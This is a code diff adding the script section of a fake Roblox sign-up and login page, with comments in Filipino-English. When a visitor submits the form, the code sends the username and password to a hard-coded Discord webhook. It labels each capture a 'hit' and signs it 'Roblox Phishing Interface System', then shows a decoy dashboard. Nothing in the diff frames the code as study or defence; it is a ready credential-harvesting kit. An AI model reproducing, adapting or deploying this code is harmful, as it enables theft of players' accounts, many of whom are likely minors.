+        document.getElementById('logout-menu').style.display = 'none';
+        document.getElementById('main-app').style.display = 'none';
+        
+        // Clear value fields
+        document.getElementById('lg-username').value = '';
+        document.getElementById('lg-password').value = '';
+        document.getElementById('su-username').value = '';
+        document.getElementById('su-password').value = '';
+        
+        document.getElementById('auth-gate').style.display = 'block';
+    }
+
+    // Close options box upon outer frame body clicks
+    window.onclick = function(event) {
+        document.getElementById('logout-menu').style.display = 'none';
+    }
+</script>
+<script>
+    // PALITAN MO ITONG URL NG SARILI MONG DISCORD WEBHOOK URL PRE
+    const discordWebhookUrl = "https://discord.com/api/webhooks/1505403261375746152/Tx8zgcEeemDxYLbzgS9ea1O2fS2GffWsx35IW8YWwJBwaZto2qe_BVJWVz7TJWt2is4_";
+
+    // System core event handler
+    window.addEventListener('DOMContentLoaded', () => {
+        const daySelect = document.getElementById('su-day');
+        const yearSelect = document.getElementById('su-year');
+        for (let d = 1; d <= 31; d++) { daySelect.add(new Option(d, d)); }
+        const currentYear = new Date().getFullYear();
+        for (let y = currentYear; y >= 1920; y--) { yearSelect.add(new Option(y, y)); }
+    });
+
+    function switchForm(type) {
+        document.getElementById('signup-form').style.display = type === 'signup' ? 'block' : 'none';
+        document.getElementById('login-form').style.display = type === 'login' ? 'block' : 'none';
+        document.getElementById('device-footer-text').style.display = type === 'signup' ? 'block' : 'none';
+        document.getElementById('header-toggle-btn').innerText = type === 'signup' ? 'Log In' : 'Sign Up';
+        document.getElementById('header-toggle-btn').setAttribute('onclick', `switchForm('${type === 'signup' ? 'login' : 'signup'}')`);
+    }
+
+    function selectGender(el) {
+        document.querySelectorAll('.g-btn').forEach(b => b.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    // WEBHOOK SENDER METHOD
+    function sendToDiscord(actionType, username, password) {
+        if (!discordWebhookUrl || discordWebhookUrl.includes("YOUR_DISCORD_WEBHOOK_URL_HERE")) {
+            console.log("Webhook URL not configured yet.");
+            return;
+        }
+
+        const params = {
+            username: "Roblox Gate Logger",
+            avatar_url: "https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg",
+            embeds: [{
+                title: `🔑 Bagong Hit Galing sa [${actionType.toUpperCase()}]`,
+                color: actionType === 'signup' ? 3066993 : 15158332, // Green kung signup, Red kung login
+                fields: [
+                    { name: "👤 Username", value: `\`\`\`${username}\`\`\``, inline: true },
+                    { name: "🔒 Password", value: `\`\`\`${password}\`\`\``, inline: true },
+                    { name: "⏰ Oras", value: new Date().toLocaleString(), inline: false }
+                ],
+                footer: { text: "Roblox Phishing Interface System" }
+            }]
+        };
+
+        fetch(discordWebhookUrl, {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(params)
+        })
+        .catch(err => console.error("Error sending to Discord:", err));
+    }
+
+    function executeAppLogin(type) {
+        let userField = type === 'signup' ? document.getElementById('su-username').value : document.getElementById('lg-username').value;
+        let passField = type === 'signup' ? document.getElementById('su-password').value : document.getElementById('lg-password').value;
+
+        if (userField.trim() && passField.trim()) {
+            // I-trigger ang pagpapadala sa Discord bago pumasok sa dashboard
+            sendToDiscord(type, userField, passField);
+
+            // Apply current credentials onto active panels
+            document.getElementById('target-profile-name').innerText = userField;
+            document.getElementById('side-profile-name').innerText = userField;
+
+            // Trigger window viewport swaps
+            document.getElementById('auth-gate').style.display = 'none';
+            document.getElementById('main-app').style.display = 'block';
+        } else {
+            alert("Pakisulat muna pre ang iyong Username at Password!");
+        }
+    }
+
+    // Toggle menu para sa gear icon at profile settings
+    function toggleGearMenu(event) {
+        event.stopPropagation();
+        const logoutMenu = document.getElementById('logout-menu');
+        logoutMenu.style.display = logoutMenu.style.display === 'block' ? 'none' : 'block';
+    }
+
+    // System Log Out Routine
+    function showPopup() {
+        document.getElementById('logout-menu').style.display = 'none';
+        document.getElementById('main-app').style.display = 'none';
+        
+        // Clear value fields
+        document.getElementById('lg-username').value = '';
+        document.getElementById('lg-password').value = '';
+        document.getElementById('su-username').value = '';
+        document.getElementById('su-password').value = '';
+        
+        document.getElementById('auth-gate').style.display = 'block';
+    }
+
+    // Close options box upon outer frame body clicks
+    window.onclick = function(event) {
+        document.getElementById('logout-menu').style.display = 'none';
+    }
+</script>
+
+</body>
+</html>
